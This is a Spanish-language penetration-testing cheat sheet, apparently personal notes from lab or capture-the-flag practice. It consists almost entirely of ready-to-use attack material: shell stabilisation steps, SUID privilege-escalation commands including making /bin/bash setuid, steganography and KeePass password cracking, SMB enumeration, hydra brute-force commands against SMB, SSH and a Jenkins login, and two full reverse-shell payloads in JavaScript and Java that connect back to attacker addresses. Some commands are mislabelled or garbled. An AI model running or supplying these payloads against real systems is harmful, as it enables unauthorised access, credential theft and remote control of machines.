#### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```
script /dev/null -c bash   
```

(hacemos  **ctrl  +  Z**)

```
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash  
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina. Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.****./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

### bash

```
chmod u+s /bin/bash
```

### images

```
steghide --extract -sf penguin.jpg -p chocolate
docker run -v $(pwd):/data -it paradoxis/stegcracker penguin.jpg
```

### keepass

```
keepass2john penguin.kdbx > keep.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ./keep.txt
kpcli --kdb=./penguin.kdbx
```

### SMB

```
smbmap -H 172.17.0.2 # listar directorios compartidos
rpcclient -U '' -N 172.17.0.2 # listar usuarios
querydispinfo and unumdomusers

METASPLOT
use scanner/smb/smb_login

hydra -l bob -P /usr/share/wordlists/rockyou.txt smb://172.17.0.2 -t 64

```

### search permissions

```
find / -perm -4000 2>/dev/null
```

### Reverse shells

##### javascript

```javascript
var host="172.17.0.1";
var port=444;
var cmd="cmd.exe";
var p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
```

##### javascript

```
String host="192.168.1.40";
int port=443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Hydra

##### Jenkins

```java
hydra -l root -p password 10.129.8.179 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:C=/login:Invalid" -s 8080 -v
```

##### ssh

```
hydra -l manchi -P /usr/share/wordlists/rockyou.txt -v 172.17.0.3 -t 4 -u ssh
```

